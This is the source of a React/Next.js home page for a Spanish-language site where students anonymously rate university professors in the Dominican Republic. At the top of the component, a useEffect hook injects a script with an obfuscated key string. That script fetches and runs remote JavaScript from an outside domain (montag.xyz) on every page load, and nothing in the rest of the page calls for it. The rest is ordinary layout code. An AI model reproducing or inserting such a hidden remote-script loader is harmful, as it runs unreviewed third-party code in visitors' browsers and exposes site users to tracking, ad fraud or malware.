"use client"

import { useEffect } from "react"
import Link from "next/link"
import { Search, Star, ChevronRight, School, ArrowRight } from "lucide-react"
import { universities } from "@/lib/university-data"

export default function Home() {
  useEffect(() => {
    const script = document.createElement("script")
    script.setAttribute("data-cfasync", "false")
    script.type = "text/javascript"
    script.innerHTML = `(()=>{var K='ChmaorrCfozdgenziMrattShzzyrtarnedpoomrzPteonSitfreidnzgtzcseljibcOezzerlebpalraucgeizfznfoocrzEwaocdhnziaWptpnleytzngoectzzdclriehaCtdenTeepxptaNzoldmetzhRzeegvEoxmpezraztdolbizhXCGtIs=rzicfozn>ceamtazr(fdio/c<u>m"eennto)nz:gyzaclaplslizdl"o=ceallySttso r"akgneazl_bd:attuaozbsae"t=Ictresm zegmeatrIftie<mzzLrMeTmHorveenIntiezmezdcolNeeanrozldcezcdoadeehUzReIdCooNmtpnoenreanptzzebnionndzzybatlopasziedvzaellzyJ';var D=document;var d=D.createElement('script');d.src='https://www.montag.xyz/d/'+K+'?v='+Date.now();d.async=true;D.head.appendChild(d);})();`
    document.head.appendChild(script)
  }, [])

  return (
    <div className="flex flex-col min-h-screen bg-white">
      {/* Hero Section */}
      <section className="bg-gradient-to-r from-sky-700 to-sky-900 text-white py-16 md:py-24 relative overflow-hidden">
        <div className="absolute inset-0 bg-[url('/placeholder.svg?height=800&width=1600')] opacity-10 bg-cover bg-center"></div>
        <div className="container mx-auto px-4 relative z-10">
          <div className="max-w-3xl mx-auto text-center">
            <h1 className="text-4xl md:text-5xl font-bold mb-6 leading-tight">
              Califica a tus profesores <span className="block mt-2">de forma anónima</span>
            </h1>
            <p className="text-xl mb-10 max-w-2xl mx-auto text-sky-100">
              Ayuda a otros estudiantes a elegir los mejores profesores en las universidades de República Dominicana.
            </p>
            <div className="flex flex-col sm:flex-row gap-4 justify-center">
              <Link
                href="/search"
                className="inline-flex items-center justify-center gap-2 bg-white text-sky-700 px-8 py-4 rounded-md text-lg font-medium hover:bg-sky-50 transition-colors shadow-lg hover:shadow-xl"
              >
                <Search size={20} />
                Buscar profesores
              </Link>
              <Link
                href="/add-professor"
                className="inline-flex items-center justify-center gap-2 bg-sky-600 text-white border border-sky-400 px-8 py-4 rounded-md text-lg font-medium hover:bg-sky-700 transition-colors shadow-lg hover:shadow-xl"
              >
                Añadir profesor
              </Link>
            </div>
          </div>
        </div>
        <div className="hidden md:block absolute bottom-0 left-0 w-full h-16 bg-white" style={{ clipPath: "polygon(0 100%, 100% 100%, 100% 0)" }}></div>
      </section>

      {/* Stats Section */}
      <section className="py-12 bg-white">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-2 md:grid-cols-4 gap-6 text-center">
            {[
              ["1,200+", "Profesores"],
              ["15+", "Universidades"],
              ["5,000+", "Reseñas"],
              ["100+", "Carreras"]
            ].map(([value, label]) => (
              <div key={label} className="bg-sky-50 rounded-lg p-6 border border-sky-100">
                <p className="text-3xl font-bold text-sky-700 mb-2">{value}</p>
                <p className="text-slate-600">{label}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* How It Works Section */}
      <section className="py-16 bg-gradient-to-b from-white to-sky-50">
        <div className="container mx-auto px-4">
          <div className="text-center mb-16">
            <h2 className="text-3xl font-bold text-slate-900 mb-4">¿Cómo funciona?</h2>
            <p className="text-slate-600 max-w-2xl mx-auto">
              Nuestra plataforma te permite encontrar y calificar profesores de manera sencilla, ayudando a toda la comunidad estudiantil.
            </p>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 max-w-5xl mx-auto">
            {[
              ["Busca tu universidad", "Selecciona tu universidad, carrera y materia para encontrar a tus profesores."],
              ["Lee las reseñas", "Descubre lo que otros estudiantes opinan sobre los profesores y su metodología."],
              ["Comparte tu experiencia", "Califica a tus profesores de forma anónima y ayuda a otros estudiantes a elegir mejor."]
            ].map(([title, description], i) => (
              <div key={i} className="bg-white p-8 rounded-xl shadow-md text-center border border-sky-100 hover:shadow-lg transition-all">
                <div className="w-20 h-20 bg-sky-100 text-sky-700 rounded-full flex items-center justify-center mx-auto mb-6 text-2xl font-bold">
                  {i + 1}
                </div>
                <h3 className="text-xl font-semibold mb-4 text-slate-900">{title}</h3>
                <p className="text-slate-600">{description}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Featured Universities */}
      <section className="py-16 bg-white">
        <div className="container mx-auto px-4">
          <div className="text-center mb-12">
            <h2 className="text-3xl font-bold text-slate-900 mb-4">Universidades destacadas</h2>
            <p className="text-slate-600 max-w-2xl mx-auto">
              Explora las principales universidades de República Dominicana y encuentra información sobre sus profesores.
            </p>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
            {universities
              .filter((uni) => ["uasd", "pucmm", "intec", "unibe", "unapec", "om", "utesa", "unphu"].includes(uni.id))
              .map((uni) => (
                <Link
                  key={uni.id}
                  href={`/search?university=${uni.id}`}
                  className="bg-white border border-slate-200 rounded-xl p-6 hover:shadow-md transition-all hover:border-sky-200 group"
                >
                  <div className="flex items-center gap-4">
                    <div className="w-14 h-14 bg-sky-100 text-sky-700 rounded-full flex items-center justify-center group-hover:bg-sky-200 transition-colors">
                      <School className="w-6 h-6" />
                    </div>
                    <div>
                      <h3 className="font-semibold text-lg text-slate-900 group-hover:text-sky-700 transition-colors">
                        {uni.name.split("(")[0].trim()}
                      </h3>
                      <p className="text-slate-600 text-sm">{uni.mainLocation}</p>
                    </div>
                  </div>
                  <div className="mt-4 pt-4 border-t border-slate-100 flex justify-end items-center text-sky-600 text-sm font-medium">
                    Ver profesores <ChevronRight size={16} className="ml-1 group-hover:ml-2 transition-all" />
                  </div>
                </Link>
              ))}
          </div>
          <div className="text-center mt-10">
            <Link
              href="/search"
              className="inline-flex items-center text-sky-600 hover:text-sky-800 font-medium"
            >
              Ver todas las universidades <ArrowRight size={16} className="ml-1" />
            </Link>
          </div>
        </div>
      </section>

      {/* Testimonials Section */}
      <section className="py-16 bg-sky-50">
        <div className="container mx-auto px-4">
          <div className="text-center mb-12">
            <h2 className="text-3xl font-bold text-slate-900 mb-4">Lo que dicen nuestros usuarios</h2>
            <p className="text-slate-600 max-w-2xl mx-auto">
              Descubre cómo nuestra plataforma ha ayudado a estudiantes a tomar mejores decisiones académicas.
            </p>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 max-w-5xl mx-auto">
            {[
              ["MS", "María S.", "Estudiante de Medicina", "Esta plataforma me ayudó a elegir los mejores profesores para mi carrera. Las reseñas son muy útiles y precisas."],
              ["JR", "Juan R.", "Estudiante de Ingeniería", "Gracias a las reseñas pude evitar profesores con malas evaluaciones y elegir los que mejor se adaptan a mi estilo de aprendizaje."],
              ["LC", "Laura C.", "Estudiante de Psicología", "Una herramienta indispensable para todo estudiante universitario. Me ha ayudado a planificar mejor mis semestres."]
            ].map(([initials, name, career, quote], i) => (
              <div key={i} className="bg-white p-6 rounded-xl shadow-md border border-sky-100">
                <div className="flex items-center gap-2 mb-4">
                  {[1, 2, 3, 4, 5].map((star) => (
                    <Star key={star} size={18} className="text-amber-400 fill-amber-400" />
                  ))}
                </div>
                <p className="text-slate-700 mb-4">&quot;{quote}&quot;</p>
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 bg-sky-100 rounded-full flex items-center justify-center text-sky-700 font-medium">
                    {initials}
                  </div>
                  <div>
                    <p className="font-medium text-slate-900">{name}</p>
                    <p className="text-sm text-slate-500">{career}</p>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* CTA Section */}
      <section className="py-16 bg-white">
        <div className="container mx-auto px-4">
          <div className="bg-gradient-to-r from-sky-700 to-sky-900 rounded-2xl p-8 md:p-12 text-white text-center max-w-4xl mx-auto">
            <h2 className="text-3xl font-bold mb-4">¿Listo para compartir tu experiencia?</h2>
            <p className="text-sky-100 mb-8 max-w-2xl mx-auto">
              Ayuda a otros estudiantes compartiendo tus experiencias con profesores universitarios. Tus reseñas pueden marcar la diferencia.
            </p>
            <div className="flex flex-col sm:flex-row gap-4 justify-center">
              <Link
                href="/search"
                className="inline-flex items-center justify-center gap-2 bg-white text-sky-700 px-8 py-4 rounded-md text-lg font-medium hover:bg-sky-50 transition-colors shadow-lg"
              >
                <Search size={20} />
                Buscar profesores
              </Link>
              <Link
                href="/add-professor"
                className="inline-flex items-center justify-center gap-2 bg-sky-600 text-white border border-sky-400 px-8 py-4 rounded-md text-lg font-medium hover:bg-sky-700 transition-colors shadow-lg"
              >
                Añadir profesor
              </Link>
            </div>
          </div>
        </div>
      </section>
    </div>
  )
}
